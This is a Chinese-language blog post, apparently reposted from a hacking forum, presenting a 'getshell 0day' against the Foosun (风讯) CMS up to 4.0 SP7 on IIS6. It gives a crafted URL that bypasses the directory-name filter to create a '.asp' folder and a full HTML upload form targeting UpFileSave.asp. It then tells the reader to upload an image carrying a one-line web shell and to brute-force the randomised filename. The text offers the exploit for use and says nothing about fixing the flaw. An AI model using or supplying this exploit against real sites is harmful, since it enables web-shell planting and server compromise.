---
title: 风讯 4.0 SP7 getshell 0day
description: 风讯4.0SP7getshell0day来源：0KEE发现者：bloodsword、bink，转载请无视影响版本：风讯<=4.0sp7，前面的版本没去看，估计也能日。利用条件，开启了文件上传功能，iis6环境。
date: 2009-08-11 10:53:22
category: 漏洞信息
tags: ['0day', '漏洞信息']
post_id: 937
alias: foosun-4.0-SP7-getshell-0day
ViewNums: 3110
---

[风讯 4.0 SP7 getshell 0day](/blog/foosun-40-sp7-getshell-0day)

来源：[0KEE](http://www.0kee.com/read.php?tid-1041.html)

发现者：bloodsword、bink，转载请无视
影响版本：[风讯 <=4.0 sp7](/blog/foosun-40-sp7-getshell-0day)，前面的版本没去看，估计也能日。
利用条件，开启了文件上传功能，iis6环境。

漏洞描述：建立目录的地方，名称过滤上有失误，导致可以绕过过滤建立一个.asp目录
首先注册个账号访问http://www.bbb.com/User/CommPages /FolderImageList.asp?f_UserNumber=06150583700&Type=AddFolder& Path=/userfiles/06150583700/aaa.asp//&CurrPath=/userfiles /06150583700其中这个06150583700是你的userid，登录了直接可以看到，建立一个.asp目录

因为风讯浏览目录的地方也过滤了.，所以建立的子目录进不去。本地构造表单：

```
<form name="FileForm" method="post" enctype="multipart/form-data" action="http://www.bbb.com/User/Commpages/UpFileSave.asp?Path=/userfiles/06150583700/aaa.asp">    <input type="hidden" name="AutoReName" value="2"><br>    <input type="hidden" name="Path" value="/userfiles/06150583700/aaa.asp">    <input type="file" size="20" name="File1">    <input type="hidden" name="FilesNum" value="1">    <input type="submit" id="BtnSubmit" name="Submit" value=" 确 定 ">    <input type="reset" id="ResetForm" name="Submit3" value=" 重 填 "></form>
```

传个夹带一句话的图片上去
恶心的地方来了，传上去的文件名是日期+时间+5位随机数（可能是4位3位2位1位，反正最大5位），这个我跟bink研究了半天，没有办法看到-_-，用管中窥豹有个暴力猜接上传路径的功能，先在正常目录里上传个文件，卡一下本地跟远程的时间差，然后传到.asp目录里，把秒数误差控制在3秒以内，开始跑吧~~然后自己该干嘛干嘛去,RP过关的话几个小时内应该能出结果-_-

